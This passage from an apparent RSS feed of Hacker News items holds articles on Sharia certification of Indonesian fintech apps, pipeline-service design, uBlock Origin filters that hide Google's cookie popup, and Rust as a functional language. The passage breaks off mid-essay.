				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-40x85.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-541x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-400x850.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>In Sharia, for example, <a href="https://www.investopedia.com/terms/r/riba.asp#:~:text=Riba%20is%20prohibited%20under%20Shari,and%20helping%20others%20through%20kindness.">charging interest, or <em>riba</em></a><em>,</em> is strictly prohibited. Sharia promotes charitable financial dealings and labels interest and guaranteed profits inherently unjust. Instead of a conventional credit model, Sharia lending platforms operate according to <a href="https://www.sciencedirect.com/science/article/pii/S187705091931230X"><em>mudarabah</em></a>. Under this model, rather than a lender extracting a profit from a borrower, the borrower and lender enter a more equitable contract. For a small-business loan, for example, the lender receives a predetermined share of profits but must also share in the losses, since the borrower has invested labor and knowledge in the business. This model underpins a host of peer-to-peer lending apps targeting Muslim users in Indonesia.</p>



<p>For Sharia stock trading, MUI mandates, under <a href="https://drive.google.com/file/d/0BxTl-lNihFyzZUxIbkR3RXV4TWc/view">Fatwa No. 80</a>, that traders invest only in halal companies. Online stock trading platforms like MNC Trade Syariah vet all potential listings accordingly, removing any that deal in gambling, alcohol, or pork products.</p>



<p>For some companies, compliance is more of a challenge. Take LinkAja. <a href="https://kr-asia.com/linkaja-ceo-danu-wicaksana-ready-to-be-the-biggest-mobile-payment-platform-in-indonesia">Launched in June 2019</a> and currently serving 45 million registered users, it’s one of the country’s largest mobile money services <a href="https://www.thejakartapost.com/adv-longform/2019/12/27/why-gojek-users-leave-their-cash-behind-and-turn-to-gopay.html">behind leaders like GoJek’s digital wallet</a> GoPay and OVO. Customers can send, store, or receive electronic money on the LinkAja app. </p>



<p>Late last year, the company announced it was building the first Sharia mobile money product in Indonesia, a digital wallet for Muslim consumers to be called LinkAja Sharia Services. Standard LinkAja app users would be able to go into their settings and switch to a parallel platform built for Sharia compliance. But before they even created a prototype, LinkAja’s team knew they needed to consult MUI.</p>



<p>Most Islamic fintech companies have an appointed head of Sharia, a taskmaster who manages the compliance process. At LinkAja, that person is Widjayanto Djaenudin. While he had no experience in Sharia technology per se, he spent more than a decade at Telkomsel, Indonesia’s largest telecoms operator, developing mobile products for the unbanked. His task at LinkAja was to liaise with MUI and guide the company through its certification process, a challenge, considering the tenuous status of Sharia scholarship on mobile money apps. </p>



<p>Some clerics have argued that <a href="http://www.ikim.gov.my/new-wp/index.php/2019/08/22/some-sharia-considerations-concerning-e-wallet/">digital wallets are a form of <em>haram</em></a>, a term for practices forbidden by Islamic law<em>. </em>The<em> </em>digital-only cash-back rebates and other discounts with partner retailers commonly found on these apps are considered, by some clerics, a form of interest payment between businesses — riba in disguise. MUI has ruled sending and storing money in digital wallets acceptable, but only under strict terms.&nbsp;</p>



<figure><blockquote><p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech.</p></blockquote></figure>



<p>After conducting a rigorous product-proposal review, MUI appointed a three-member supervisory board to Djaenudin’s team well-versed in the nuances of its rulings. The board included Anwar Abbas, chairman of an Islamic reformist organization in Southern Java’s Yogyakarta and author of a national bestseller promoting the vice president’s “Shariatization” worldview, <a href="https://www.tokopedia.com/dojobuku/ma-ruf-amin-way-sahala-panggabean-by-anwar-abbas"><em>The Ma’ruf Amin Way</em></a><em>. </em>“They are all Sharia experts,” said Djaenudin. “They gave us guidance and consultations about the product.” </p>



<p>Starting in November 2019, shortly after the vice president’s Shariatization initiative, Djaenudin was required to brief these scholars on market research, product testing, and the ins and outs of engineering every month. MUI’s supervisory board would share their insights and ensure the technological infrastructure of the app followed MUI’s rulings.&nbsp;</p>



<p>An MUI fatwa issued in 2017 was of particular concern to Djaenudin. <a href="https://drive.google.com/file/d/1KPAvhhziJ61Pt8EFxxTFfDPNmRHJoQDG/view">Fatwa No. 116</a> begins with verses from the Quran published in both classical Arabic script and Bahasa Indonesian. “O you who have believed, when you contract a debt for a specified term, write it down. And let a scribe write it between you in justice,” reads one verse. They are followed closely by <a href="https://yaqeeninstitute.org/emadhamdeh/are-hadith-necessary/">quotations from books of <em>hadith</em></a>, records of the sayings of the Prophet Muhammad: “Do not sell gold for gold, and do not sell silver for silver, except in case of like for like.”</p>



<p>These threads of theological precedent are woven together to create a set of rulings reinterpreting classical verse for the new digital economy. According to the fatwa, these Quranic lines have a specific implication for fintech: floating funds must be housed in certified Islamic banks. Contracts between all parties — users, banking institutions, or the app itself — must be grounded in Sharia contract law. Any promotional campaign cannot include riba.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-40x23.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-400x232.png 400w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-600x348.png 600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1000x580.png 1000w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1600x928.png 1600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-2800x1623.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>The supervisory board had other suggestions for LinkAja’s parallel Sharia platform, Djaenudin told <em>Rest of World</em>. The new version of the app embedded a <em>zakat </em>payment feature, <a href="https://www.islamic-relief.org.uk/about-us/what-we-do/zakat/">a form of religious tithing and worship</a> performed through charitable donations, customarily amounting to 2.5% of one’s total savings. After the board signed off on the feature, LinkAja partnered with 240 MUI-approved charitable institutions and 1,000 mosques nationwide <a href="https://news.detik.com/adv-nhl-detikcom/d-5019749/wahai-umat-muslim-ini-cara-mudah-berzakat-lewat-layanan-syariah-linkaja">to launch the zakat feature</a>. Months of vetting culminated in a full audit of LinkAja’s operations at its Jakarta headquarters by MUI.&nbsp;</p>



<p>According to Widjayanto, LinkAja paid a $300 (4 million rupiah) charge to MUI for its Sharia certificate, which lasts three years, including a $20 transportation fee for the auditor.&nbsp;</p>



<p>LinkAja Sharia Services <a href="https://www.idnfinancials.com/news/33503/link-aja-launches-linkaja-sharia-services">launched on April 14</a>, just one week before the start of Ramadan. In its first month, it saw 100,000 user registrations. Djaenudin credits the MUI Sharia certificate for this first wave of customers. Most Indonesians prefer to use a Sharia-branded service, even if few understand the particulars of riba or mudarabah, according to LinkAja market research. “From the customer’s perspective, as long as they see the halal logo or Sharia certificate from a trusted body, which is MUI, it gives them clearance and trust,” said Djaenudin.</p>



<p>For Indonesian fintech entrepreneurs hoping to establish their Sharia credentials, the MUI certificate has become the gold standard. Ronald Yusuf Wijaya, the founder of two Sharia-compliant crowdfunding startups, converted to Islam while building his business. “It’s been almost nine years, and I’m learning all of this from the day I started my business,” he said. Wijaya is chairman of the <a href="https://fintechsyariah.id/en">Indonesian Sharia Fintech Association (AFSI)</a>, a trade association that lobbies on behalf of <a href="https://www.reuters.com/article/us-indonesia-digitalpayments-islam/sharia-fintech-startups-race-to-tap-indonesia-growth-by-aligning-with-islam-idUSKBN20Q0IA">this burgeoning pocket of the Indonesian economy</a>. Since converting, Wijaya has successfully navigated MUI Sharia certification with both his companies. “Some customers, they ask, ‘Are you certified, or are you just Sharia?’”&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-40x86.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-538x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-400x857.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>For most Sharia fintech startups, MUI certificates are not only commercially advantageous but legally required by the Financial Services Authority of Indonesia (OJK), the state financial regulator. Other areas of the Sharia digital economy, like <a href="https://www.salaamgateway.com/story/indonesian-e-commerce-giant-tokopedia-aiming-for-10-of-total-transactions-to-come-from-new-islamic-m">halal e-commerce</a> and <a href="https://www.salaamgateway.com/story/indonesia-gets-first-diy-umrah-platform-e-commerce-giant-starts-selling-pilgrimage-packages"><em>umrah </em>sites</a>, travel-booking platforms for Islamic pilgrimages, do not require this certificate.&nbsp;</p>



<p>Dr. Ir. H. Nadratuzzaman Hosen, vice chair of DSN MUI, told <em>Rest of World</em> that MUI is a passive actor in the development of new apps — waiting idly for companies to seek its approval rather than imposing fatwas on companies as a theocratic …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/now-serving-halal-apps/">https://restofworld.org/2020/now-serving-halal-apps/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/now-serving-halal-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516141</guid>
            <pubDate>Fri, 18 Sep 2020 12:59:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Features of a proper pipeline service – my improvement roadmap for CodePipeline]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516099">thread link</a>) | @donkersgood
<br/>
September 18, 2020 | https://www.sentiatechblog.com/features-of-a-proper-pipeline-service | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/features-of-a-proper-pipeline-service">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!--## Features of a proper pipeline service-->
<p>I recently <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/aws-needs-to-step-up-its-devops-game-and-a-few-other-takeaways-from-the-new">published a post</a> criticizing the state of developer tooling in AWS. Today I’ll be more constructive and describe the features that encompass a proper pipeline service.</p>
<p>Please note: this article is about pipeline <em>services</em>, not a specific pipeline. In other words, we’ll look at a tool used to create pipelines, not the pipeline itself.</p>
<p>A pipeline service should be versatile, allowing developers to create pipelines which deploy their applications and infrastructure in a way that works for them. A pipeline service should support multiple sources, be flexible in the number of build steps, allow for parallel builds, and so on.</p>
<p>In this article we’ll explore a number of core features to support many different types of workflows. There are some references to AWS, but these principles are generic and should apply to any cloud or SaaS solution.</p>
<h3>Any Git repository, any authentication method</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/3xmbfK5AanPsQdN2gmfdZF/d3d10f9a05c2a8140e51f83177f38ab1/auth.png?fit=scale&amp;w=1330" alt="Git authentication methods"><br>
This might seem like an open door, but for some reason generic Git repositories are not supported in AWS CodePipeline. For a pipeline service to be successful, it should not require developers to host their application on a specific platform like GitHub. Instead, the pipeline service should support the raw Git implementation and allow developers to choose whether to use HTTPS, SSH with username and password, SSH with SSH keys, or OAuth deploy keys.</p>
<p>By supporting these options, the pipeline service offers maximum flexibility while allowing developers to utilize basic security measures like read-only deploy keys.</p>
<h3>Any branch, any commit</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5nSt8Mfxf75F2iSWWlzJLt/8f5fd9da6c9e5ac396492faf93b5d6fa/any_commit.png?fit=scale&amp;w=1330" alt="Building any commit"><br>
Many pipelines services require a pipeline to be hardcoded to a specific branch; one pipeline which detects changes on the <code>develop</code> branch, then builds and deploys environment A, and a completely separate pipeline that detects changes on the <code>main</code> branch, then builds and deploys environment B. This might be fine 80% of the time, but it’s a real hassle in the other 20%.</p>
<p>A common example that does not work in this setup is a <code>hotfix</code> branch, typically used to branch from <code>main</code> to fix a high priority bug. In some cases, this fix is experimental - you do not know if it will resolve the issue. If your pipeline is ‘stuck’ on the <code>main</code> branch, you would need to merge this untested change to the <code>main</code> branch before deploying, which goes against Git principles.</p>
<p>Of course, an argument of ‘no untested code should be deployed in production’ can be made, but not all of us are Google, and some of us need to do deployments in the middle of the night without anybody available to do a code review.</p>
<p>Another use case for dynamic branch selection is deploying feature branches into an acceptance environment. There are use cases where the feature branch has been reviewed, but needs to be tested in a very specific context. Instead of merging the change before executing the test, developers should have the freedom and responsibility to deploy a feature branch to an acceptance environment, testing the feature, and merging the change after it has been verified.</p>
<p>Expanding on the ‘any branch’ feature, a pipeline should allow developers to deploy a specific commit, not just the HEAD of a branch. Maybe your developers have been working on a feature, but decide that they want to test an earlier version to compare the differences. The pipeline should not force users to use HEAD or require them to create a separate branch from a commit to be able to build older commits.</p>
<p>To support these use cases, a pipeline should be flexible in its branch selection, and a pipeline service should either allow a pipeline to be easily updated or, better yet, decouple the source, build and deploy steps altogether. More on that in the next chapter.</p>
<h3>Decoupled source, build and deploy steps</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/7KUR68soKqQg4viajidrbW/4ae3d06c8c0eb0775f7371187a6d2c1d/decoupled.png?fit=scale&amp;w=1330" alt="Decoupled source, build and deploy steps"><br>
To resolve the ‘any branch, any commit’ issue, a pipeline should offer an interface that displays all the branches, commits and tags in the repository, and allows developers to choose which commit to run the pipeline on. This means the source and build steps are decoupled. Instead of running the pipeline when a new commit is detected on a preconfigured branch (strictly coupling the source and the build step), the source repository’s metadata should synchronize independently, and choosing a commit should result in an artifact that is used as the initial step for the pipeline.</p>
<p>You might wonder how decoupling the source and build steps impacts automated testing and deployments. Clearly, we can’t run the full pipeline on every branch and every commit. We’ll cover this problem in the ‘Automated builds and releases’ section later in this article.</p>
<p>Once a source commit has been chosen, it should be built. Optionally, this step can be skipped, instead moving the source artifact to the deploy step immediately. More on the build step follows in the next chapter.</p>
<p>At this point, either the source step has provided an artifact that’s ready to deploy, or the source artifact has been built by the build step, and <em>that</em> has resulted in a deployable artifact.</p>
<h4>Promoting builds</h4>
<p>To guarantee that the code running in production is exactly the same as the code that was tested in an acceptance environment, it should be possible to ‘promote’ an artifact from acceptance to production. To achieve this, developers (or an automated system) should be able to choose where to deploy a build artifact - to a developer, test, sandbox, acceptance, production or any other environment.</p>
<p>This results in decoupled build and deploy steps, and the artifact is used to glue any build result to any deploy environment. Through this mechanism, any commit can result in an artifact which can first be deployed to acceptance, and then be deployed to production. This solution moves the responsibility for deploying the right commits to the different environments from the pipeline’s configuration to the engineers. With great power comes great responsibility - in other words: this allows engineers to **** **** up big time, for example by deploying an untested commit to production - but with the fine grained access control discussed in a later section, the pipeline maintainers will be able to manage who wields this power.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5MWeOQDhfrVDVxsshn2nQ4/9e261a01faa8e731aec67cc51346b026/verify.png?fit=scale&amp;w=1330" alt="Verifying and promoting builds"></p>
<p>“Wait!” I hear you shout from the audience, “doesn’t that mean that all environments will be production sized?”. But no, this can be controlled through parameters. In other words, the deployment process ‘knows’ which environment it’s deploying to and will read the correct parameters for that environment, for example configuring t3.medium instances for acceptance and m5.xlarge instances for production.</p>
<h3>Build anything</h3>
<p>The build step described in the previous step is used to convert any source artifact to a deployable artifact. That might mean running unit tests, compiling files, compressing or packaging files, cleaning caches, generating CloudFormation templates, or anything in between. To support this, the build phase should be able to run about any kind of script or code, including Ruby, Python, Bash, .NET, NodeJS, Zip, Terraform, CDK, and so on. AWS CodeBuild is an awesome single-run container platform that is perfectly suited for this requirement.</p>
<h3>Rollbacks</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/Q8gGGfoxpCVGORKLuBJl3/ba889b281b6742e649af96775720b998/rollbacks.png?fit=scale&amp;w=1330" alt="Rollbacks"><br>
An essential feature for any pipeline is the support of rollbacks. Simply put: the pipeline should be able to revert back to a previous version of the environment in case any issues with the latest release are encountered. This can either be done automatically, for example when a test reports a failure, or manually, in case engineers or customers report an issue. This strongly relates to the next chapter: build and release history.</p>
<h3>Build and release history</h3>
<p>Because the source, build and deploy steps have been decoupled, releases are not guaranteed to match any Git branch’s chronology anymore. For example, the acceptance environment might have releases from a feature branch, the dev branch, and older feature branch and the main branch, in any order. Likewise, the last commit on the <code>main</code> branch (commit <code>N</code>) might be deployed to production, but commit <code>N - 1</code>, <code>N - 2</code> and <code>N - 3</code> might have not have been, making the previous release on production commit <code>N - 4</code>. Because of this, it is important to have an overview of every build and release in the environment, including build logs and audit trails.</p>
<p>When a release history for an environment is available, rollbacks can be implemented by including a ‘redeploy this build’ button for every build artifact.</p>
<h3>Fine-grained access control</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/6ejm6J4n82oCeUdImhLveq/43c560378aa8697801204ab071b67e13/access_control.png?fit=scale&amp;w=1330" alt="Access control"><br>
The pipelines created are inherently flexible and powerful, which means that any user with sufficient access can deploy any (potentially broken) feature to any environment. To mitigate this, the pipeline service should provide fine-grained access control, allowing specific users or groups to edit pipelines, build sources, and deploy to specific environments. When properly implemented, this allows some engineers to deploy only to their own environments, some to the acceptance environments, and only a small subset to be responsible for production releases.</p>
<h3>Automated builds and releases</h3>
<p>There are a number of cases in which automated builds or releases can be beneficial or necessary. Common situations are automatically building and testing any commit on the <code>develop</code> branch, or automatically deploying the HEAD of the <code>main</code> branch to acceptance.</p>
<p>Another common scenario is scheduled scaling, for example shutting down developer environments when they are not in use or automatically scaling down acceptance environments outside of office hours.</p>
<p>To provide solutions for both use cases, the pipeline service should allow specific branches or tags to be configured for automated releases; when a new commit on this branch or of this tag has been detected, the pipeline will automatically build that commit, generate a build artifact, and deploy this to the selected environment.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5nOX2HIPLzxWnuupr6SiC0/3b64fdd0f8b5d61abeb675487e3aa272/automated_releases.png?fit=scale&amp;w=1330" alt="Automated releases"><br>
To achieve the scaling objective, a scheduled trigger should be able to select a source commit and to supply environmental variables to the build and deploy processes, for example <code>SCALE_DOWN = true</code>, so the deployment …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sentiatechblog.com/features-of-a-proper-pipeline-service">https://www.sentiatechblog.com/features-of-a-proper-pipeline-service</a></em></p>]]>
            </description>
            <link>https://www.sentiatechblog.com/features-of-a-proper-pipeline-service</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516099</guid>
            <pubDate>Fri, 18 Sep 2020 12:57:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting rid of the Google cookie consent popup]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24515998">thread link</a>) | @edward
<br/>
September 18, 2020 | https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html | <a href="https://web.archive.org/web/*/https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
    
        <nav id="primary-nav">
        

        <ul><li><a href="https://daniel-lange.com/">Blog</a></li><li><a href="https://daniel-lange.com/pages/software.html">Software</a></li><li><a href="https://daniel-lange.com/pages/contact.html">Contact</a></li></ul>
    </nav>
        <div>
        <main id="content">
        
            <article id="post_164">
        <header>
            <h2><a href="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">Getting rid of the Google cookie consent popup</a></h2>

            
        </header>

        <div>
        <p><a href="https://daniel-lange.com/categories/18-Internet"><img title="Internet: Remember ... all I'm offering is the truth. Nothing more. (Morpheus to Neo who is choosing the red pill)" alt="Internet" src="https://daniel-lange.com/uploads/http.serendipityThumb.jpg"></a></p><p>If you clear your browser cookies regularly (as you should do), Google will annoy you with a full screen cookie consent overlay these days. And - of course - there is no "no tracking consent, technically required cookies only" button. You may log in to Google to set your preference. Yeah, I'm sure this is totally following the intent of the <a href="https://eur-lex.europa.eu/eli/dir/2009/136/2009-12-19">EU Directive 2009/136/EC</a> (the "cookie law").</p>

<p><!-- s9ymdb:664 --><img width="1332" height="1066" src="https://daniel-lange.com/uploads/entries/200918_Google_cookie_consent_screen.png" alt="Google cookie consent pop-up"></p>

<p>Unfortunately none of the big "anti-annoyances" filter lists seem to have picked that one up yet but the friendly folks from the <a href="https://www.computerbase.de/forum/threads/google-nervt-bevor-sie-fortfahren.1968809/">Computerbase Forum</a> [German] to the rescue. User "Sepp Depp" has created the following filter set that <abbr title="Works For Me">WFM</abbr>:</p>

<p>Add this to your <a href="https://github.com/gorhill/uBlock">uBlock Origin</a> "My filters" tab:</p>

<pre>! Google - remove cookie-consent-popup and restore scoll functionality
google.*##.wwYr3.aID8W.bErdLd
google.*##.aID8W.m114nf.t7xA6
google.*##div[jsname][jsaction^="dg_close"]
google.*##html:style(overflow: visible !important;)
google.*##.widget-consent-fullscreen.widget-consent
</pre>

                </div>
                
        

        <!--
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
                 xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
                 xmlns:dc="http://purl.org/dc/elements/1.1/">
        <rdf:Description
                 rdf:about="https://daniel-lange.com/feeds/ei_164.rdf"
                 trackback:ping="https://daniel-lange.com/comment.php?type=trackback&amp;entry_id=164"
                 dc:title="Getting rid of the Google cookie consent popup"
                 dc:identifier="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html" />
        </rdf:RDF>
        -->

                                            
        

        
            <a id="feedback"></a>
                        

        
    </article>
        



        </main>
                
        </div>

    
</div></div>]]>
            </description>
            <link>https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515998</guid>
            <pubDate>Fri, 18 Sep 2020 12:48:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Rust a Functional Language in Disguise?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515759">thread link</a>) | @praveenperera
<br/>
September 18, 2020 | https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/ | <a href="https://web.archive.org/web/*/https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is something I’ve been asking myself while learning Rust. Yes, I know that this sounds like a weird question to ask as it’s no secret that Rust has huge influence from the functional programming world. Closures, iterators, pattern matching, algebraic data types; these are features inspired by FP languages, so obviously you can do functional programming with Rust. But that’s not really my question. What I’m asking is if Rust is a <strong>mainly</strong> functional language.</p>



<p>These days most mainstream imperative languages have functional features, you can do FP in any of them, but that doesn’t mean that those languages are considered functional. On the other hand, some languages are designed mainly to be functional, I’m talking about Haskell, Clojure, OCaml or Erlang. So, to be more clear, I can rephrase my question as: Is Rust a language designed to be used mainly for functional programming? Or is it another imperative language where you can optionally use FP?</p>



<p>At first glance, it looks like the answer is simple. Rust very much looks like an imperative language with support for some popular features from functional languages. But after a closer look at the language, I’ve come to realize that it is closer to a purely functional language than I thought. It is <strong>a functional language disguised as imperative</strong>. I will try to explain what I mean in this post.</p>



<h2>What is functional programming?</h2>



<p>Before explaining why I think that Rust is mainly a functional language, it is a good idea to first explain what functional programming is. This is not as easy as it sounds, so first a disclaimer: This is far from a formal definition, but rather a hand-wavy explanation of what I understand as FP.</p>



<p><em>Side note: I am making this disclaimer because in the past I’ve experienced some quite angry responses from FP enthusiasts about this point of view. That made me quit FP for a while until I found the very friendly Clojure community. And I’m happy to report that in my first steps with Rust so far I have met an equally friendly community.</em></p>



<p>The core ideas behind Functional Programming are immutability and lack of side effects. That’s it. If you mostly use pure functions that receive data and return data without mutating any sort of external state, then you’re doing FP. On the other hand, if you mostly call functions or methods that alter or mutate some external state, then you are doing imperative programming.</p>



<p>To avoid side effects, functional languages use immutable data structures. Let’s jump to some small code examples to illustrate this difference. I know these examples are a bit silly and there are other ways to write them, but I just want a simple code example to illustrate my point. Here is how you use a hash map (dictionary) in Python, which is a mainly imperative language:</p>


<div>
<pre>film = {}
film[<span>"title"</span>] = <span>"Fargo"</span>
film[<span>"director"</span>] = <span>"Joel Coen"</span>
</pre>
</div>


<p>And here is how you use a hash map in Clojure, a mainly functional language:</p>


<div>
<pre>(<span>let </span>[film1 {}
      film2 (assoc film1 <span>"title"</span> <span>"Fargo"</span>)
      film3 (assoc film2 <span>"director"</span> <span>"Joel Coen"</span>)])
</pre>
</div>


<p>The main difference between these two approaches is that in Python you create one map, then you mutate it to add some entries to it. In Clojure you can’t mutate the map, instead, what you can do is to create a new map based on the previous one.</p>



<p>Now, let’s check how the same thing looks in Rust:</p>


<div>
<pre><span>let</span> <span>mut</span> film = HashMap::new();
film.insert(<span>"title"</span>, <span>"fargo"</span>);
film.insert(<span>"director"</span>, <span>"Joel Coen"</span>);
</pre>
</div>


<p>The Rust example is much closer to the imperative Python than the functional Clojure. And just in case there is any doubt, we have the <strong>mut</strong> keyword right there, which means <strong>mutable</strong>.</p>



<p><em>Side note: Unlike some other languages that also have keywords to distinguish mutable and immutable values (<strong>final</strong> in java, <strong>const</strong> in JavaScript, <strong>readonly</strong> in C#, <strong>val</strong> in Kotlin), one interesting thing about Rust is that this applies to the whole value, not just the superficial reference. In Java, nothing prevents you from mutating a HashMap in a final reference. Rust won’t allow any sort of mutation unless you use <strong>mut</strong> (I’m going to conveniently ignore Interior Mutability for now, mostly because I think I don’t fully understand it yet).</em></p>



<p>So after looking at the code examples, we can conclude that Rust is mainly an imperative language. Or is it? I know that this sounds very counter intuitive, but I think that the Rust example is actually closer to the functional style than the imperative one. Yes, I’ll explain why at some point, please be patient.</p>



<h2>If a tree falls in the woods, does it make a sound?</h2>



<p>Here is the thing, pure Functional Programming is an illusion, it’s not real. Even the purest of the FP languages are mutating things and producing some side effects behind the scenes. Real computers are imperative machines. Your pure functions have to change registries, push stack frames, etc. So we can say that FP languages are merely an emulation, they are not&nbsp; the real thing. This doesn’t mean that FP doesn’t have any value, I actually think there is a lot of value in it. Especially in the fact that FP produces programs that are easier to understand and to maintain. But it’s important to understand that purity is unachievable.</p>



<p>Let’s take another look at my previous Clojure code example:</p>


<div>
<pre>(<span>let </span>[film1 {}
      film2 (assoc film1 <span>"title"</span> <span>"Fargo"</span>)
      film3 (assoc film2 <span>"director"</span> <span>"Joel Coen"</span>)])
</pre>
</div>


<p>Here Clojure doesn’t really create entirely new data structures on every operation. That would be very inefficient. Instead, Clojure internally uses something called <a href="http://lampwww.epfl.ch/papers/idealhashtrees.pdf">Hash Array Mapped Tries (HAMT)</a>. When you use <strong>assoc</strong> in Clojure to add an entry to a map, it looks like it’s generating a completely new map, but in reality, both maps share most of the same internal structure, they are really one single HAMT, and <strong>assoc</strong> is actually mutating that HAMT.</p>



<p>So data structures in Clojure are actually mutable, but that doesn’t really matter because their interface is side effect free for the external world. Clojure is still a mainly functional language. And that’s a key aspect of FP; it’s not about completely avoiding mutation, that is impossible in real computers, it’s about hiding those mutations in a way that they don’t create side effects for the rest of the code. In FP we want our units of computation (functions) to depend only on their inputs and not on some external state. That’s what makes them easier to reason about.</p>



<p>Now back to our small Python example:</p>


<div>
<pre>film[<span>"title"</span>] = <span>"Fargo"</span>
film[<span>"director"</span>] = <span>"Joel Coen"</span>
</pre>
</div>


<p>The key difference here, compared to the Clojure example, is that the world is not shielded from this mutation. We could have some class or other part of the code holding a reference to this map, and as soon as we mutate this we are creating a side effect for those parts of the code. This makes code harder to reason about. It’s the same reason why global variables are considered a bad practice, and it’s also the reason why many programmers prefer to use FP.</p>



<p>Let’s go back to the Rust example. This time I added a reference to the map, which will be the observer of the mutation side effect:</p>


<div>
<pre><span>let</span> <span>mut</span> film = HashMap::new();
<span>let</span> observer = &amp;film;
film.insert(<span>"title"</span>, <span>"fargo"</span>);
film.insert(<span>"director"</span>, <span>"Joel Coen"</span>);
println!(<span>"{}"</span>, observer.len());
</pre>
</div>


<p>If you are a Rust programmer you of course know that <strong>this code won’t compile</strong>. Here is what the awesome Rust compiler says about it:</p>


<div>
<pre>error[E0502]: cannot borrow `film` as mutable because it is also borrowed as immutable
 --&gt; src/main.rs:6:5
  |
5 |     let observer = &amp;film;
  |                    ----- immutable borrow occurs here
6 |     film.insert("title", "fargo");
  |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ mutable borrow occurs here
7 |     film.insert("director", "Joel Coen");
8 |     println!("{}", observer.len());
  |                    -------- immutable borrow later used here
</pre>
</div>


<p>This error happens because Rust’s ownership and borrowing rules only allow either one single mutable reference or many immutable ones. In other words,<strong> if you are going to mutate an object in Rust, you can’t have any other part of the code holding a reference to that object</strong>. This is mostly checked statically by the compiler. So mutation in Rust is like a tree falling in the forest where there is no one to hear it. It’s a mutation that doesn’t produce side effects. And this is exactly what FP is about.</p>



<h2>The struggles of learning a language</h2>



<p>Rust has not been as easy to learn for me as other languages. The borrow checker, which is the part that verifies the mutability and lifetime of references, is famous among Rust beginners as the toughest part to get used to.</p>



<p>While struggling with the borrow checker I started to notice something: the kinds of patterns that caused me trouble with the borrow checker are very similar to the ones that caused me trouble when learning functional programming. For example, when I was learning Clojure by solving some <a href="https://adventofcode.com/">Advent of Code</a> problems, I got to a problem where the best solution was to use a circularly linked list. I was trying to solve the problems using pure FP and I quickly hit a wall. Later on, when I needed a similar data structure in Rust I also hit a wall. This kind of data structures are hard to implement both in pure FP and in Rust.</p>



